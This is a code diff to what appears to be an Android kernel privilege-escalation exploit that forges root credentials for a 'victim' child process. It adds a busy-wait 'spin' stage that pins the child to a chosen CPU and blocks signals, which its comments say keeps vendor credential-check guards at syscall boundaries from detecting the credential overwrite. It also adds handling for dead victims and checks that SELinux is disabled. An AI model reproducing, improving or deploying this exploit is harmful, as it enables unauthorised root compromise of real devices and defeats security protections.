@@ -11,6 +11,11 @@
 #include "support/native_resource.hpp"
 
 #include <array>
+#include <sched.h>
+#include <signal.h>
+#include <sys/mman.h>
+#include <sys/resource.h>
+#include <cstring>
 
 namespace ghostlock::session::victim {
     /* rooted exits kfree the static init_cred (w2 stores it with no
@@ -22,6 +27,74 @@ namespace ghostlock::session::victim {
             (void) write(adj.get(), value, sizeof(value) - 1);
         }
         for (;;) pause();
+    }
+
+    /* Allocate the page the W2 spin protocol shares with the child. Failure is
+     * not fatal: the stage falls back to the old blocked-read protocol. */
+    static void alloc_spin_page(VictimContext &p) {
+        p.release_spin_page();
+        void *page = mmap(nullptr, sizeof(SpinPage), PROT_READ | PROT_WRITE,
+                          MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+        if (page == MAP_FAILED) {
+            pr_warning("victim spin: mmap failed errno=%d; using the blocked-read protocol\n",
+                       errno);
+            return;
+        }
+        auto *spin = static_cast<SpinPage *>(page);
+        memset(spin, 0, sizeof(*spin));
+        spin->cpu = kSpinCpuNone;
+        p.spin = spin;
+    }
+
+    /* Child side: after the arm command, leave the kernel for the whole window.
+     * Pinning and signal blocking happen first, while the task is unrooted; from
+     * `spin_child_ready` until the release the loop makes no syscall, so a vendor
+     * guard that compares credentials at syscall entry/exit sees nothing. */
+    static void spin_for_release(VictimContext &p) {
+        SpinPage *page = p.spin;
+        if (page == nullptr) return;
+        const uint32_t seq = spin_child_begin(page);
+
+        /* The child inherited the forking thread's mask -- the native main
+         * thread is pinned to the route's main CPU -- so the inherited mask is
+         * not the allowed set. Widen it by trying each non-pair CPU: the cgroup
+         * cpuset is the real bound, and the first success is the pin. */
+        uint32_t chosen = kSpinCpuNone;
+        const uint32_t main_cpu = page->main_cpu;
+        const uint32_t consumer_cpu = page->consumer_cpu;
+        /* 64 covers every Android SoC; the rest of CPU_SETSIZE never exists. */
+        constexpr uint32_t kSpinMaxCpu = 64;
+        for (uint32_t cpu = 0; cpu < kSpinMaxCpu; cpu++) {
+            if (cpu == main_cpu || cpu == consumer_cpu) continue;
+            cpu_set_t set;
+            CPU_ZERO(&set);
+            CPU_SET(static_cast<int32_t>(cpu), &set);
+            if (sched_setaffinity(0, sizeof(set), &set) == 0) {
+                chosen = cpu;
+                break;
+            }
+        }
+        if (chosen != kSpinCpuNone) {
+            struct sched_param param{};
+            param.sched_priority = 0;
+            (void) sched_setscheduler(0, SCHED_IDLE, &param);
+            (void) setpriority(PRIO_PROCESS, 0, 19);
+        }
+
+        /* A delivered signal would enter rt_sigreturn -- a syscall whose entry
+         * and exit could straddle the credential write. */
+        sigset_t all{};
+        sigset_t old{};
+        sigfillset(&all);
+        const int32_t blocked = (sigprocmask(SIG_BLOCK, &all, &old) == 0);
+
+        page->cpu = chosen;
+        page->flags = (chosen != kSpinCpuNone) ? kSpinFlagPinned : kSpinFlagNoOffPairCpu;
+        spin_child_ready(page, seq);
+        while (spin_child_released(page, seq) == 0) {
+            __asm__ volatile("" ::: "memory");
+        }
+        if (blocked) (void) sigprocmask(SIG_SETMASK, &old, nullptr);
     }
 
     static void child_main(VictimContext &p) {
@@ -102,6 +175,8 @@ namespace ghostlock::session::victim {
                 uint32_t report =
                         (static_cast<uint32_t>(len) << 8) | static_cast<uint32_t>(static_cast<unsigned char>(comm[0]));
                 write(p.uid_write.get(), &report, sizeof(report));
+            } else if (cmd == 'S') {
+                spin_for_release(p);
             } else if (cmd == 'P') {
                 /* w2 rooted this task; park */
                 p.cmd_read.reset();
@@ -186,6 +261,7 @@ namespace ghostlock::session::victim {
 
     static pid_t spawn_child(VictimContext &p) {
         std::array<int32_t, 2> p1{}, p2{}, p3{};
+        alloc_spin_page(p);
         if (pipe(p1.data()) < 0 || pipe(p2.data()) < 0 || pipe(p3.data()) < 0) return -1;
         p.task_read.reset(p1[0]);
         p.task_write.reset(p1[1]);
@@ -227,6 +303,62 @@ namespace ghostlock::session::victim {
         return VictimSpawn{child, leaked};
     }
 
+    /* Parent side of the spin. The child inherits the forking thread's mask --
+     * the native main thread is pinned to the route's main CPU -- so the parent
+     * only publishes the pair to avoid; the child widens its own affinity. */
+    static int32_t spin_wait_for_arm(const SpinPage *page, uint32_t seq) {
+        /* The child publishes armed before it starts spinning, so a healthy arm
+         * is sub-millisecond; the bound covers a heavily preempted child. */
+        constexpr int32_t kArmTimeoutMs = 2000;
+        for (int32_t waited = 0; waited < kArmTimeoutMs; waited++) {
+            if (spin_parent_armed(page, seq)) return 1;
+            usleep(1000);
+        }
+        return 0;
+    }
+
+    int32_t arm_w2_spin(void *context) {
+        auto *stage = static_cast<w2_stage_context *>(context);
+        SpinPage *page = stage->pipes.spin;
+        if (page == nullptr || stage->victim_dead) return 0;
+        if (stage->spin_armed) return 1;
+        const auto &cfg = config::runtime_config_snapshot();
+        page->main_cpu = static_cast<uint32_t>(cfg.main_cpu);
+        page->consumer_cpu = static_cast<uint32_t>(cfg.consumer_cpu);
+        page->cpu = kSpinCpuNone;
+        const uint32_t seq = spin_parent_arm(page);
+        errno = 0;
+        if (write(stage->pipes.cmd_write.get(), "S", 1) != 1) {
+            const int32_t sent_errno = errno;
+            if (sent_errno == EPIPE) {
+                pr_warning("victim spin: arm command failed (errno=%d); the victim is gone\n",
+                           sent_errno);
+                stage->victim_dead = 1;
+            } else {
+                pr_warning("victim spin: arm command failed (errno=%d)\n", sent_errno);
+            }
+            return 0;
+        }
+        if (!spin_wait_for_arm(page, seq)) {
+            pr_warning("victim spin: arm timeout\n");
+            spin_parent_release(page, seq); /* never strand a late spin */
+            return 0;
+        }
+        stage->spin_seq = seq;
+        stage->spin_armed = 1;
+        const uint32_t cpu = __atomic_load_n(&page->cpu, __ATOMIC_ACQUIRE);
+        const uint32_t flags = __atomic_load_n(&page->flags, __ATOMIC_ACQUIRE);
+        pr_info("victim spin: armed seq=%u cpu=%u flags=%u\n", seq, cpu, flags);
+        return 1;
+    }
+
+    void release_victim_spin(w2_stage_context &stage) {
+        SpinPage *page = stage.pipes.spin;
+        if (page == nullptr || !stage.spin_armed) return;
+        spin_parent_release(page, stage.spin_seq);
+        stage.spin_armed = 0;
+    }
+
     int32_t verify_selinux_stage(void *context) {
         (void) context;
         if (!attack::check_selinux_off()) return 0;
@@ -242,25 +374,54 @@ namespace ghostlock::session::victim {
          * answers (a command written into a full pipe, or EAGAIN on a
          * non-blocking read). Every W2 failure in the rate-fix4 series read as
          * "no output between the round headers" -- two runs of the series were
-         * spent on that ambiguity. errno is what tells them apart. */
+         * spent on that ambiguity. errno is what tells them apart.
+         *
+         * A dead child is terminal for the stage: no later attempt can succeed,
+         * and each one writes init_cred into a freed task_struct (the
+         * 2026-11-22 Realme report). EOF and EPIPE both mean dead; anything
+         * else is a live miss and re-arms the spin for the next attempt. */
+        if (stage->victim_dead) return -1;
+
+        /* Release first: the child's next syscall is the command read, whose
+         * entry snapshot is taken after the credential write. */
+        release_victim_spin(*stage);
+
         errno = 0;
         if (write(stage->pipes.cmd_write.get(), "C", 1) != 1) {
+            const int32_t sent_errno = errno;
+            if (sent_errno == EPIPE) {
+                pr_warning("W2 verify: no command sent (errno=%d); the victim is gone\n",
+                           sent_errno);
+                stage->victim_dead = 1;
+                return -1;
+            }
             pr_warning("W2 verify: no command sent (errno=%d); the child is not consuming\n",
-                       errno);
+                       sent_errno);
+            (void) arm_w2_spin(context);
             return 0;
         }
 
         uint32_t child_uid = 9999;
         errno = 0;
         const ssize_t got = read(stage->pipes.uid_read.get(), &child_uid, sizeof(child_uid));
+        if (got == 0) {
+            pr_warning("W2 verify: reply read 0 of %llu bytes; the victim is gone\n",
+                       static_cast<unsigned long long>(sizeof(child_uid)));
+            stage->victim_dead = 1;
+            return -1;
+        }
         if (got != static_cast<ssize_t>(sizeof(child_uid))) {
             pr_warning("W2 verify: reply read %lld of %llu bytes (errno=%d)\n",
                        static_cast<long long>(got),
                        static_cast<unsigned long long>(sizeof(child_uid)), errno);
+            (void) arm_w2_spin(context);
             return 0;
         }
         pr_info("child uid = %u\n", child_uid);
-        if (child_uid != 0) return 0;
+        if (child_uid != 0) {
+            (void) arm_w2_spin(context);
+            return 0;
+        }
         pr_success("child is root!\n");
         return 1;
     }
